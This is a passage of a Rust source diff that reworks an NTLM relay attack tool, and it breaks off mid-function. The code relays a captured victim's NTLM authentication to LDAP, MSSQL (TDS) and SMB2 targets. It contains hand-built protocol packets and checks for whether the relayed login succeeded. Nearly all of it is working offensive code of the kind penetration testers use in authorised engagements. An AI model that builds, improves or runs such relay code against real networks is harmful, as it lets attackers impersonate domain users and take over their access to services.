-        // Step 1: Send LDAP bind request with NTLM NEGOTIATE
-        let bind_request = self.build_ldap_ntlm_bind(ntlm_negotiate, 1);
-        stream.write_all(&bind_request)
-            .map_err(|e| RelayError::Network(format!("LDAP write failed: {}", e)))?;
-
-        // Step 2: Read LDAP response with NTLM CHALLENGE
-        let mut response = vec![0u8; 8192];
-        let len = stream.read(&mut response)
-            .map_err(|e| RelayError::Network(format!("LDAP read failed: {}", e)))?;
-
-        // Parse LDAP response to extract NTLM challenge
-        // LDAP returns saslBindInProgress (0x0E) with the challenge
         if len < 10 {
             return Err(RelayError::Protocol("LDAP response too short".into()).into());
         }
 
-        debug!("Received LDAP NTLM challenge from {}", target.address);
+        // Extract NTLM challenge from LDAP bind response (saslBindInProgress)
+        let challenge = extract_ntlm_from_ldap_response(&response[..len])?;
 
-        // Step 3: Send LDAP bind request with NTLM AUTHENTICATE
-        let bind_auth = self.build_ldap_ntlm_bind(ntlm_authenticate, 2);
-        stream.write_all(&bind_auth)
-            .map_err(|e| RelayError::Network(format!("LDAP auth write failed: {}", e)))?;
+        debug!("Got NTLM challenge from LDAP {}", target.address);
+        Ok((stream, challenge))
+    }
 
-        // Step 4: Read final response
-        let len = stream.read(&mut response)
-            .map_err(|e| RelayError::Network(format!("LDAP auth read failed: {}", e)))?;
+    async fn ldap_authenticate(
+        &self,
+        stream: &mut TcpStream,
+        ntlm_authenticate: &[u8],
+    ) -> Result<()> {
+        let bind_req = build_ldap_sasl_bind(ntlm_authenticate, 2);
+        stream
+            .write_all(&bind_req)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP auth write: {}", e)))?;
 
-        // Check LDAP result code
-        // Success is at a specific position in the LDAP response
-        // A result code of 0 (success) is at offset 13 in a simple response
-        if len >= 14 {
-            let result_code = response[13];
-            if result_code == 0 {
-                let (username, domain) = self.parse_ntlm_authenticate_info(ntlm_authenticate)?;
-                
-                info!("LDAP relay successful: {}\\{} -> {}", domain, username, target.address);
-                
-                return Ok(RelayedSession {
-                    stream,
-                    username,
-                    domain,
-                });
-            }
+        let mut response = vec![0u8; 16384];
+        let len = stream
+            .read(&mut response)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP auth read: {}", e)))?;
+
+        // Parse LDAP bind response — find the resultCode
+        let result_code = parse_ldap_bind_result(&response[..len])?;
+
+        if result_code == 0 {
+            Ok(())
+        } else {
+            Err(RelayError::Authentication(format!(
+                "LDAP bind failed with result code {}",
+                result_code
+            ))
+            .into())
         }
-
-        Err(RelayError::Authentication("LDAP relay failed".into()).into())
     }
 
-    /// Build LDAP NTLM bind request
-    fn build_ldap_ntlm_bind(&self, ntlm_data: &[u8], message_id: u32) -> Vec<u8> {
-        let mut msg = Vec::new();
+    // ═══════════════════════════════════════════════════════════
+    // MSSQL/TDS Relay — Phase 1 & 2
+    // ═══════════════════════════════════════════════════════════
 
-        // Build the LDAP message
-        // 0x30 = SEQUENCE, wraps the whole message
-        let _ntlm_b64 = base64_encode(ntlm_data);
-        
-        // Simplified LDAP bind request
-        // In a real implementation, we'd use proper BER encoding
-        let bind_dn = "";
-        let auth_mechanism = "NTLM";
-        
-        // LDAP bind request structure:
-        // SEQUENCE {
-        //   INTEGER messageID
-        //   APPLICATION 0 (BindRequest) {
-        //     INTEGER version (3)
-        //     OCTET STRING name (DN)
-        //     authenticationChoice (sasl) {
-        //       mechanism
-        //       credentials
-        //     }
-        //   }
-        // }
-
-        let inner_seq_len = 2 + 1 + ntlm_data.len() + auth_mechanism.len() + 4;
-        let bind_len = 4 + bind_dn.len() + inner_seq_len;
-        let msg_len = 4 + bind_len;
-
-        // Start outer sequence
-        msg.push(0x30);
-        msg.push(msg_len as u8);
-
-        // Message ID
-        msg.push(0x02); // INTEGER
-        msg.push(0x01); // Length 1
-        msg.push(message_id as u8);
-
-        // BindRequest (APPLICATION 0)
-        msg.push(0x60); // APPLICATION 0 = BindRequest
-        msg.push(bind_len as u8);
-
-        // Version (INTEGER 3)
-        msg.push(0x02);
-        msg.push(0x01);
-        msg.push(0x03);
-
-        // DN (OCTET STRING, empty)
-        msg.push(0x04);
-        msg.push(0x00);
-
-        // Authentication: SASL (context tag 3)
-        msg.push(0xA3); // Context tag for SASL
-        msg.push(inner_seq_len as u8);
-
-        // Mechanism: NTLM
-        msg.push(0x04); // OCTET STRING
-        msg.push(auth_mechanism.len() as u8);
-        msg.extend_from_slice(auth_mechanism.as_bytes());
-
-        // Credentials
-        msg.push(0x04); // OCTET STRING
-        msg.push(ntlm_data.len() as u8);
-        msg.extend_from_slice(ntlm_data);
-
-        msg
-    }
-
-    // ─────────────────────────────────────────────────────────
-    // MSSQL Relay Implementation
-    // ─────────────────────────────────────────────────────────
-
-    /// Relay to MSSQL target
-    fn relay_mssql(
+    async fn mssql_negotiate_and_challenge(
         &self,
         target: &RelayTarget,
         ntlm_negotiate: &[u8],
-        ntlm_authenticate: &[u8],
-    ) -> Result<RelayedSession> {
-        info!("Relaying to MSSQL target: {}", target.address);
-
-        // Connect to target
-        let mut stream = TcpStream::connect_timeout(
-            &target.address,
-            Duration::from_secs(self.config.timeout_secs)
-        ).map_err(|e| RelayError::Connection(format!(
-            "Failed to connect to {}: {}", target.address, e
-        )))?;
-
-        stream.set_read_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
-        stream.set_write_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
+        timeout: Duration,
+    ) -> Result<(TcpStream, Vec<u8>)> {
+        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
+            .await
+            .map_err(|_| {
+                RelayError::Connection(format!("Timeout connecting to {}", target.address))
+            })?
+            .map_err(|e| RelayError::Connection(format!("MSSQL connect: {}", e)))?;
 
         let mut buf = vec![0u8; 65536];
 
-        // MSSQL uses TDS protocol with NTLM authentication
-        // Step 1: Send TDS PRELOGIN
-        let prelogin = self.build_tds_prelogin();
-        stream.write_all(&prelogin)
-            .map_err(|e| RelayError::Network(format!("TDS prelogin write failed: {}", e)))?;
+        // TDS PRELOGIN
+        let prelogin = build_tds_prelogin();
+        stream
+            .write_all(&prelogin)
+            .await
+            .map_err(|e| RelayError::Network(format!("TDS prelogin write: {}", e)))?;
 
-        // Read prelogin response
-        let _len = stream.read(&mut buf)
-            .map_err(|e| RelayError::Network(format!("TDS prelogin read failed: {}", e)))?;
+        let _len = stream
+            .read(&mut buf)
+            .await
+            .map_err(|e| RelayError::Network(format!("TDS prelogin read: {}", e)))?;
 
-        debug!("TDS prelogin complete with {}", target.address);
+        debug!("TDS prelogin OK with {}", target.address);
 
-        // Step 2: Send TDS LOGIN7 with NTLM NEGOTIATE
-        let login = self.build_tds_login_with_ntlm(ntlm_negotiate);
-        stream.write_all(&login)
-            .map_err(|e| RelayError::Network(format!("TDS login write failed: {}", e)))?;
+        // TDS LOGIN7 with NTLM negotiate as SSPI
+        let login = build_tds_login7_sspi(ntlm_negotiate);
+        stream
+            .write_all(&login)
+            .await
+            .map_err(|e| RelayError::Network(format!("TDS login write: {}", e)))?;
 
-        // Step 3: Read response with NTLM CHALLENGE
-        let _len = stream.read(&mut buf)
-            .map_err(|e| RelayError::Network(format!("TDS login read failed: {}", e)))?;
+        let len = stream
+            .read(&mut buf)
+            .await
+            .map_err(|e| RelayError::Network(format!("TDS login read: {}", e)))?;
 
-        // Parse TDS response to get NTLM challenge
-        // The server returns a token with the NTLM challenge
+        // Extract NTLM challenge from TDS SSPI token
+        let challenge = extract_ntlm_from_tds(&buf[..len])?;
 
-        debug!("Received MSSQL NTLM challenge from {}", target.address);
+        debug!("Got NTLM challenge from MSSQL {}", target.address);
+        Ok((stream, challenge))
+    }
 
-        // Step 4: Send NTLM AUTHENTICATE
-        let auth = self.build_tds_ntlm_auth(ntlm_authenticate);
-        stream.write_all(&auth)
-            .map_err(|e| RelayError::Network(format!("TDS auth write failed: {}", e)))?;
+    async fn mssql_authenticate(
+        &self,
+        stream: &mut TcpStream,
+        ntlm_authenticate: &[u8],
+    ) -> Result<()> {
+        // TDS SSPI continuation (packet type 0x11)
+        let auth_pkt = build_tds_sspi_message(ntlm_authenticate);
+        stream
+            .write_all(&auth_pkt)
+            .await
+            .map_err(|e| RelayError::Network(format!("TDS auth write: {}", e)))?;
 
-        // Step 5: Read final response
-        let len = stream.read(&mut buf)
-            .map_err(|e| RelayError::Network(format!("TDS auth read failed: {}", e)))?;
+        let mut buf = vec![0u8; 65536];
+        let len = stream
+            .read(&mut buf)
+            .await
+            .map_err(|e| RelayError::Network(format!("TDS auth read: {}", e)))?;
 
-        // Check for success
-        // TDS returns 0xFD (LOGINACK) on success
-        if len > 0 && buf[0] == 0x04 { // Response packet
-            let (username, domain) = self.parse_ntlm_authenticate_info(ntlm_authenticate)?;
-            
-            info!("MSSQL relay successful: {}\\{} -> {}", domain, username, target.address);
-            
-            Ok(RelayedSession {
-                stream,
-                username,
-                domain,
-            })
+        if len == 0 {
+            return Err(RelayError::Authentication("Empty TDS response".into()).into());
+        }
+
+        // Check for LOGINACK token (0xAD) anywhere in the response
+        // TDS response packet type 0x04 = Response
+        if buf[0] == 0x04 {
+            // Scan for LOGINACK token
+            for i in 8..len.saturating_sub(1) {
+                if buf[i] == 0xAD {
+                    return Ok(());
+                }
+            }
+            // Check for ERROR token (0xAA) for better diagnostics
+            for i in 8..len.saturating_sub(1) {
+                if buf[i] == 0xAA {
+                    return Err(RelayError::Authentication(
+                        "TDS returned ERROR token — auth failed".into(),
+                    )
+                    .into());
+                }
+            }
+        }
+
+        Err(RelayError::Authentication(format!(
+            "MSSQL auth failed — TDS packet type 0x{:02X}",
+            buf[0]
+        ))
+        .into())
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// SMB2 PDU Builders
+// ═══════════════════════════════════════════════════════════
+
+/// Build correct SMB2 NEGOTIATE request.
+///
+/// Layout per [MS-SMB2] 2.2.3:
+///   NetBIOS(4) + Header(64) + NegotiateBody(36+dialects)
+fn build_smb2_negotiate(message_id: u64) -> Vec<u8> {
+    let mut msg = Vec::with_capacity(128);
+
+    // ── NetBIOS session header (4 bytes) ──
+    msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Length placeholder
+
+    // ── SMB2 header (64 bytes) ──
+    msg.extend_from_slice(b"\xfeSMB"); // ProtocolId
+    msg.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
+    msg.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
+    msg.extend_from_slice(&0u32.to_le_bytes()); // Status
+    msg.extend_from_slice(&0x0000u16.to_le_bytes()); // Command: NEGOTIATE
+    msg.extend_from_slice(&31u16.to_le_bytes()); // CreditRequest
+    msg.extend_from_slice(&0u32.to_le_bytes()); // Flags
+    msg.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
+    msg.extend_from_slice(&message_id.to_le_bytes()); // MessageId (u64)
+    msg.extend_from_slice(&0u32.to_le_bytes()); // Reserved
+    msg.extend_from_slice(&0u32.to_le_bytes()); // TreeId
+    msg.extend_from_slice(&0u64.to_le_bytes()); // SessionId (u64)
+    msg.extend_from_slice(&[0u8; 16]); // Signature
+
+    // ── NEGOTIATE request body (36 + dialects) ──
+    msg.extend_from_slice(&36u16.to_le_bytes()); // StructureSize
+    msg.extend_from_slice(&3u16.to_le_bytes()); // DialectCount
+    msg.extend_from_slice(&1u16.to_le_bytes()); // SecurityMode (signing enabled)
+    msg.extend_from_slice(&0u16.to_le_bytes()); // Reserved
+    msg.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
+    msg.extend_from_slice(&[0u8; 16]); // ClientGuid (random not needed for relay)
+
+    // ClientStartTime (8 bytes, 0 = MBZ when DialectCount > 0)
+    msg.extend_from_slice(&0u64.to_le_bytes());
+
+    // Dialects
+    msg.extend_from_slice(&0x0202u16.to_le_bytes()); // SMB 2.0.2
+    msg.extend_from_slice(&0x0210u16.to_le_bytes()); // SMB 2.1
+    msg.extend_from_slice(&0x0300u16.to_le_bytes()); // SMB 3.0
+
+    // Patch NetBIOS length
+    let len = (msg.len() - 4) as u32;
+    msg[1] = ((len >> 16) & 0xFF) as u8;
+    msg[2] = ((len >> 8) & 0xFF) as u8;
+    msg[3] = (len & 0xFF) as u8;
+
+    msg
+}
+
+/// Build correct SMB2 SESSION_SETUP request.
+///
+/// Layout per [MS-SMB2] 2.2.5:
+///   NetBIOS(4) + Header(64) + SessionSetup(24+security_buffer)
+fn build_smb2_session_setup(ntlm_data: &[u8], session_id: u64, message_id: u64) -> Vec<u8> {
+    let mut msg = Vec::with_capacity(128 + ntlm_data.len());
+
+    // ── NetBIOS session header ──
+    msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
+
+    // ── SMB2 header (64 bytes) ──
+    msg.extend_from_slice(b"\xfeSMB");
+    msg.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
+    msg.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
+    msg.extend_from_slice(&0u32.to_le_bytes()); // Status
+    msg.extend_from_slice(&0x0001u16.to_le_bytes()); // Command: SESSION_SETUP
+    msg.extend_from_slice(&31u16.to_le_bytes()); // CreditRequest
+    msg.extend_from_slice(&0u32.to_le_bytes()); // Flags
+    msg.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
+    msg.extend_from_slice(&message_id.to_le_bytes()); // MessageId
+    msg.extend_from_slice(&0u32.to_le_bytes()); // Reserved
+    msg.extend_from_slice(&0u32.to_le_bytes()); // TreeId
+    msg.extend_from_slice(&session_id.to_le_bytes()); // SessionId (u64!)
+    msg.extend_from_slice(&[0u8; 16]); // Signature
+
+    // ── SESSION_SETUP request body ──
+    // StructureSize = 25 (fixed, per spec)
+    msg.extend_from_slice(&25u16.to_le_bytes());
+    // Flags (0 = none)
+    msg.push(0x00);
+    // SecurityMode (1 = signing enabled)
+    msg.push(0x01);
+    // Capabilities (0)
+    msg.extend_from_slice(&0u32.to_le_bytes());
+    // Channel (0)
+    msg.extend_from_slice(&0u32.to_le_bytes());
+
+    // SecurityBufferOffset = header(64) + session_setup_body(24) minus the
+    // 4-byte netbios prefix that's not counted. Per MS-SMB2, the offset is
+    // from the beginning of the SMB2 header.
+    // Header(64) + body_fixed_part(24) = 88
+    let security_buffer_offset: u16 = 88;
+    msg.extend_from_slice(&security_buffer_offset.to_le_bytes());
+    // SecurityBufferLength
+    msg.extend_from_slice(&(ntlm_data.len() as u16).to_le_bytes());
+    // PreviousSessionId (u64)
+    msg.extend_from_slice(&0u64.to_le_bytes());
+
+    // Security buffer (NTLM data)
+    msg.extend_from_slice(ntlm_data);
+
+    // Patch NetBIOS length
+    let len = (msg.len() - 4) as u32;
+    msg[1] = ((len >> 16) & 0xFF) as u8;
+    msg[2] = ((len >> 8) & 0xFF) as u8;
+    msg[3] = (len & 0xFF) as u8;
+
+    msg
+}
+
+/// Extract NTLM message from SMB2 SESSION_SETUP response
+fn extract_ntlm_from_smb2(data: &[u8]) -> Result<Vec<u8>> {
+    // Scan for NTLMSSP signature
+    for i in 0..data.len().saturating_sub(12) {
+        if &data[i..i + 8] == NTLM_SIGNATURE {
+            if let Some(NtlmMessageType::Challenge) = parse_ntlm_type(&data[i..]) {
+                // Determine challenge message length from target name + target info fields
+                // Minimum challenge is 56 bytes, but can be longer with target info
+                let end = find_ntlm_challenge_end(&data[i..]);
+                return Ok(data[i..i + end].to_vec());
+            }
+        }
+    }
+    Err(RelayError::Protocol("No NTLM challenge in SMB2 response".into()).into())
+}
+
+/// Estimate the end of an NTLM challenge message
+fn find_ntlm_challenge_end(ntlm_data: &[u8]) -> usize {
+    if ntlm_data.len() < 32 {
+        return ntlm_data.len();
+    }
+
+    // Check for target info at offset 40..48
+    if ntlm_data.len() >= 48 {
+        let info_len = u16::from_le_bytes([ntlm_data[40], ntlm_data[41]]) as usize;
+        let info_offset =
+            u32::from_le_bytes([ntlm_data[44], ntlm_data[45], ntlm_data[46], ntlm_data[47]])
+                as usize;
+
+        if info_offset + info_len <= ntlm_data.len() && info_offset + info_len > 0 {
+            return info_offset + info_len;
+        }
+    }
+
+    // Fallback: check target name at offset 12..20
+    if ntlm_data.len() >= 20 {
+        let name_len = u16::from_le_bytes([ntlm_data[12], ntlm_data[13]]) as usize;
+        let name_offset =
+            u32::from_le_bytes([ntlm_data[16], ntlm_data[17], ntlm_data[18], ntlm_data[19]])
+                as usize;
+
+        if name_offset + name_len <= ntlm_data.len() {
+            return name_offset + name_len;
+        }
+    }
+
+    ntlm_data.len().min(256)
+}
+
+// ═══════════════════════════════════════════════════════════
+// LDAP PDU Builders (proper BER encoding)
+// ═══════════════════════════════════════════════════════════
+
+/// Build LDAP SASL Bind request with GSS-SPNEGO wrapping.
+///
+/// Uses proper BER definite-length encoding that handles
+/// payloads > 127 bytes.
+fn build_ldap_sasl_bind(ntlm_data: &[u8], message_id: u32) -> Vec<u8> {
+    let mechanism = b"GSS-SPNEGO";
+
+    // Build innermost → outermost
+    // Credentials: OCTET STRING
+    let cred_tlv = ber_octet_string(ntlm_data);
+    // Mechanism: OCTET STRING
+    let mech_tlv = ber_octet_string(mechanism);
+    // SASL auth choice: context tag [3] SEQUENCE { mechanism, credentials }
+    let sasl_inner = [mech_tlv, cred_tlv].concat();
+    let sasl_tlv = ber_wrap(0xA3, &sasl_inner);
+
+    // Version: INTEGER 3
+    let version_tlv = ber_integer(3);
+    // DN: OCTET STRING (empty)
+    let dn_tlv = ber_octet_string(b"");
+
+    // BindRequest: APPLICATION 0
+    let bind_inner = [version_tlv, dn_tlv, sasl_tlv].concat();
+    let bind_tlv = ber_wrap(0x60, &bind_inner);
+
+    // Message ID: INTEGER
+    let msgid_tlv = ber_integer(message_id as i64);
+
+    // SEQUENCE (top-level LDAP message)
+    let msg_inner = [msgid_tlv, bind_tlv].concat();
+    ber_wrap(0x30, &msg_inner)
+}
+
+/// Parse LDAP BindResponse to extract result code
+fn parse_ldap_bind_result(data: &[u8]) -> Result<u8> {
+    // Walk the BER structure to find the resultCode
+    // SEQUENCE { INTEGER(msgid), APPLICATION 1 (BindResponse) { ENUMERATED(resultCode), ... } }
+    // We scan for the pattern: 0x61 (APPLICATION 1) followed by length, then 0x0A (ENUMERATED)
+
+    for i in 0..data.len().saturating_sub(4) {
+        if data[i] == 0x61 {
+            // APPLICATION 1 = BindResponse
+            let (inner_start, _inner_len) = match ber_read_length(data, i + 1) {
+                Some(v) => v,
+                None => continue,
+            };
+            // First element should be ENUMERATED (0x0A) = resultCode
+            if inner_start < data.len() && data[inner_start] == 0x0A {
+                let (val_start, val_len) = match ber_read_length(data, inner_start + 1) {
+                    Some(v) => v,
+                    None => continue,
+                };
+                if val_len > 0 && val_start < data.len() {
+                    return Ok(data[val_start]);
+                }
+            }
+        }
+    }
+
+    Err(RelayError::Protocol("Cannot parse LDAP bind result".into()).into())
+}
+
+/// Extract NTLM message from LDAP BindResponse serverSaslCreds
+fn extract_ntlm_from_ldap_response(data: &[u8]) -> Result<Vec<u8>> {
+    // Scan for NTLMSSP signature in the response
+    for i in 0..data.len().saturating_sub(12) {
+        if &data[i..i + 8] == NTLM_SIGNATURE {
+            if let Some(NtlmMessageType::Challenge) = parse_ntlm_type(&data[i..]) {
+                let end = find_ntlm_challenge_end(&data[i..]);
+                return Ok(data[i..i + end].to_vec());
+            }
+        }
+    }
+    Err(RelayError::Protocol("No NTLM challenge in LDAP response".into()).into())
+}
+
+// ── BER helpers ──
+
+fn ber_encode_length(len: usize) -> Vec<u8> {
+    if len < 128 {
+        vec![len as u8]
+    } else if len < 256 {
+        vec![0x81, len as u8]
+    } else if len < 65536 {
+        vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
+    } else {
+        vec![
+            0x83,
+            (len >> 16) as u8,
+            ((len >> 8) & 0xFF) as u8,
+            (len & 0xFF) as u8,
+        ]
+    }
+}
+
+fn ber_wrap(tag: u8, content: &[u8]) -> Vec<u8> {
+    let mut tlv = vec![tag];
+    tlv.extend_from_slice(&ber_encode_length(content.len()));
+    tlv.extend_from_slice(content);
+    tlv
+}
+
+fn ber_octet_string(data: &[u8]) -> Vec<u8> {
+    ber_wrap(0x04, data)
+}
+
+fn ber_integer(val: i64) -> Vec<u8> {
+    let bytes = if val == 0 {
+        vec![0x00]
+    } else if val > 0 && val < 128 {
+        vec![val as u8]
+    } else if val > 0 && val < 256 {
+        if val > 127 {
+            vec![0x00, val as u8]
         } else {
-            Err(RelayError::Authentication("MSSQL relay failed".into()).into())
+            vec![val as u8]
         }
+    } else {
+        let be = val.to_be_bytes();
+        let start = be.iter().position(|&b| b != 0).unwrap_or(7);
+        // If high bit set, prepend 0x00 for positive numbers
+        if val > 0 && be[start] & 0x80 != 0 {
+            let mut v = vec![0x00];
+            v.extend_from_slice(&be[start..]);
+            v
+        } else {
+            be[start..].to_vec()
+        }
+    };
+    ber_wrap(0x02, &bytes)
+}
+
+fn ber_read_length(data: &[u8], offset: usize) -> Option<(usize, usize)> {
+    if offset >= data.len() {
+        return None;
     }
-
-    /// Build TDS PRELOGIN packet
-    fn build_tds_prelogin(&self) -> Vec<u8> {
-        let mut msg = Vec::new();
-
-        // TDS header
-        msg.push(0x12); // PRELOGIN message type
-        msg.push(0x01); // Status (0x01 = EOM)
-        msg.extend_from_slice(&0x0000u16.to_be_bytes()); // Length (will update)
-        msg.extend_from_slice(&0x0000u16.to_be_bytes()); // SPID
-        msg.push(0x00); // Packet ID
-        msg.push(0x00); // Window
-
-        // Prelogin data
-        // Version token
-        msg.push(0x00); // Token: Version
-        msg.extend_from_slice(&0x0008u16.to_be_bytes()); // Offset
-        msg.extend_from_slice(&0x0006u16.to_be_bytes()); // Length
-
-        // Encryption token
-        msg.push(0x01); // Token: Encryption
-        msg.extend_from_slice(&0x000Eu16.to_be_bytes()); // Offset
-        msg.extend_from_slice(&0x0001u16.to_be_bytes()); // Length
-
-        // Terminator
-        msg.push(0xFF);
-
-        // Version data (SQL Server 2019)
-        msg.extend_from_slice(&0x0F000000u32.to_be_bytes()); // Version
-        msg.extend_from_slice(&0x0000u16.to_be_bytes()); // Sub-build
-
-        // Encryption (ENCRYPT_OFF)
-        msg.push(0x02);
-
-        // Update length
-        let len = msg.len() as u16;
-        msg[2..4].copy_from_slice(&len.to_be_bytes());
-
-        msg
-    }
-
-    /// Build TDS LOGIN7 packet with NTLM
-    fn build_tds_login_with_ntlm(&self, ntlm_data: &[u8]) -> Vec<u8> {
-        let mut msg = Vec::new();
-
-        // TDS header
-        msg.push(0x10); // LOGIN7 message type
-        msg.push(0x01); // Status (EOM)
-        
-        let header_len_pos = msg.len();
-        msg.extend_from_slice(&0u16.to_be_bytes()); // Length placeholder
-        msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
-        msg.push(0x00); // Packet ID
-        msg.push(0x00); // Window
-
-        // LOGIN7 fixed fields
-        let login_data_start = msg.len();
-        msg.extend_from_slice(&0u32.to_le_bytes()); // Total length placeholder
-        msg.extend_from_slice(&0u32.to_le_bytes()); // Version
-        msg.extend_from_slice(&0u32.to_le_bytes()); // Packet size
-        msg.extend_from_slice(&0u32.to_le_bytes()); // ClientPID
-        msg.extend_from_slice(&0u32.to_le_bytes()); // ConnectionID
-        msg.extend_from_slice(&0u32.to_le_bytes()); // Option flags 1-2
-        msg.extend_from_slice(&0u32.to_le_bytes()); // Option flags 3-4
-        msg.extend_from_slice(&0u32.to_le_bytes()); // Client time zone
-        msg.extend_from_slice(&0u32.to_le_bytes()); // Client LCID
-
-        // Offset-length pairs for variable data
-        // For simplicity, use offsets pointing to NTLM auth data
-        let offset_base = msg.len() + 28 * 8; // After fixed + offset pairs
-        
-        // Host name
-        msg.extend_from_slice(&offset_base.to_le_bytes());
-        msg.extend_from_slice(&0u16.to_le_bytes());
-        // Username
-        msg.extend_from_slice(&offset_base.to_le_bytes());
-        msg.extend_from_slice(&0u16.to_le_bytes());
-        // Password
-        msg.extend_from_slice(&offset_base.to_le_bytes());
-        msg.extend_from_slice(&0u16.to_le_bytes());
-        // App name
-        msg.extend_from_slice(&offset_base.to_le_bytes());
-        msg.extend_from_slice(&0u16.to_le_bytes());
-        // Server name
-        msg.extend_from_slice(&offset_base.to_le_bytes());
-        msg.extend_from_slice(&0u16.to_le_bytes());
-        // ... more fields ...
-
-        // NTLM SSPI data
-        // ibSSPI = current position
-        // cbSSPI = NTLM data length
-        let _sspi_offset = msg.len() as u32;
-        
-        // Add NTLM negotiate as SSPI blob
-        msg.extend_from_slice(ntlm_data);
-
-        // Update total length
-        let total_len = msg.len() as u32;
-        msg[login_data_start..login_data_start+4].copy_from_slice(&total_len.to_le_bytes());
-
-        // Update header length
-        let len = msg.len() as u16;
-        msg[header_len_pos..header_len_pos+2].copy_from_slice(&len.to_be_bytes());
-
-        msg
-    }
-
-    /// Build TDS NTLM auth continuation
-    fn build_tds_ntlm_auth(&self, ntlm_data: &[u8]) -> Vec<u8> {
-        let mut msg = Vec::new();
-
-        // TDS header
-        msg.push(0x11); // TDS7_AUTH message type
-        msg.push(0x01); // Status (EOM)
-        msg.extend_from_slice(&(ntlm_data.len() as u16 + 8).to_be_bytes()); // Length
-        msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
-        msg.push(0x01); // Packet ID
-        msg.push(0x00); // Window
-
-        // NTLM authenticate blob
-        msg.extend_from_slice(ntlm_data);
-
-        msg
-    }
-
-    // ─────────────────────────────────────────────────────────
-    // Utility Functions
-    // ─────────────────────────────────────────────────────────
-
-    /// Parse username/domain from NTLM AUTHENTICATE message
-    fn parse_ntlm_authenticate_info(&self, data: &[u8]) -> Result<(String, String)> {
-        if data.len() < 64 {
-            return Err(RelayError::Protocol("NTLM authenticate too short".into()).into());
+    let first = data[offset];
+    if first < 128 {
+        Some((offset + 1, first as usize))
+    } else {
+        let num_bytes = (first & 0x7F) as usize;
+        if offset + 1 + num_bytes > data.len() {
+            return None;
         }
-
-        // Check signature
-        if &data[0..8] != NTLM_SIGNATURE {
-            return Err(RelayError::Protocol("Invalid NTLM signature".into()).into());
+        let mut len: usize = 0;
+        for i in 0..num_bytes {
+            len = (len << 8) | data[offset + 1 + i] as usize;
         }
-
-        // Check type
-        if parse_ntlm_type(data) != Some(NtlmMessageType::Authenticate) {
-            return Err(RelayError::Protocol("Not an AUTHENTICATE message".into()).into());
-        }
-
-        // Helper to extract field
-        fn extract_field(data: &[u8], offset: usize) -> Option<Vec<u8>> {
-            let len = u16::from_le_bytes([data[offset], data[offset + 1]]) as usize;
-            let buffer_offset = u32::from_le_bytes([
-                data[offset + 4], data[offset + 5],
-                data[offset + 6], data[offset + 7]
-            ]) as usize;
-
-            if len == 0 {
-                return Some(Vec::new());
-            }
-
-            if buffer_offset + len <= data.len() {
-                Some(data[buffer_offset..buffer_offset + len].to_vec())
-            } else {
-                None
-            }
-        }
-
-        let domain_bytes = extract_field(data, 28).unwrap_or_default();
-        let username_bytes = extract_field(data, 36).unwrap_or_default();
-
-        // Convert from UTF-16LE
-        let domain = decode_utf16le(&domain_bytes);
-        let username = decode_utf16le(&username_bytes);
-
-        Ok((username, domain))
+        Some((offset + 1 + num_bytes, len))
     }
 }
 
-/// Result of a successful relay
-struct RelayedSession {
-    stream: TcpStream,
-    username: String,
-    domain: String,
+// ═══════════════════════════════════════════════════════════
+// TDS PDU Builders
+// ═══════════════════════════════════════════════════════════
+
+/// Build TDS PRELOGIN packet
+fn build_tds_prelogin() -> Vec<u8> {
+    let mut msg = Vec::with_capacity(48);
+
+    // TDS header (8 bytes)
+    msg.push(0x12); // Type: PRELOGIN
+    msg.push(0x01); // Status: EOM
+    msg.extend_from_slice(&0u16.to_be_bytes()); // Length placeholder
+    msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
+    msg.push(0x00); // PacketID
+    msg.push(0x00); // Window
+
+    // ── PRELOGIN option tokens ──
+    // Each token: type(1) + offset(2) + length(2)
+    // Token 0: VERSION — offset=11, length=6
+    msg.push(0x00);
+    msg.extend_from_slice(&11u16.to_be_bytes());
+    msg.extend_from_slice(&6u16.to_be_bytes());
+
+    // Terminator
+    msg.push(0xFF);
+
+    // VERSION data: 15.0.0.0 (SQL 2019) + SubBuild 0
+    msg.extend_from_slice(&[0x0F, 0x00, 0x00, 0x00]);
+    msg.extend_from_slice(&0u16.to_be_bytes());
+
+    // Patch TDS length
+    let len = msg.len() as u16;
+    msg[2..4].copy_from_slice(&len.to_be_bytes());
+
+    msg
+}
+
+/// Build TDS LOGIN7 with NTLM negotiate as SSPI blob.
+///
+/// Per [MS-TDS] 2.2.6.4, LOGIN7 has a 94-byte fixed header
+/// followed by variable data. The SSPI blob offset/length is
+/// at header offset 0x5E (ibSSPI: u16, cbSSPI: u16).
+fn build_tds_login7_sspi(ntlm_data: &[u8]) -> Vec<u8> {
+    let mut msg = Vec::with_capacity(256);
+
+    // TDS header (8 bytes)
+    msg.push(0x10); // Type: LOGIN7
+    msg.push(0x01); // Status: EOM
+    msg.extend_from_slice(&0u16.to_be_bytes()); // Length placeholder
+    msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
+    msg.push(0x01); // PacketID
+    msg.push(0x00); // Window
+
+    // ── LOGIN7 fixed portion (94 bytes from start of TDS data) ──
+    let login_start = msg.len();
+
+    msg.extend_from_slice(&0u32.to_le_bytes()); // Length (placeholder)
+    msg.extend_from_slice(&0x74000004u32.to_le_bytes()); // TDSVersion (7.4)
+    msg.extend_from_slice(&4096u32.to_le_bytes()); // PacketSize
+    msg.extend_from_slice(&0u32.to_le_bytes()); // ClientProgVer
+    msg.extend_from_slice(&std::process::id().to_le_bytes()); // ClientPID
+    msg.extend_from_slice(&0u32.to_le_bytes()); // ConnectionID
+    // OptionFlags1: USE_DB_ON | INIT_DB_FATAL | SET_LANG_ON
+    msg.push(0xE0);
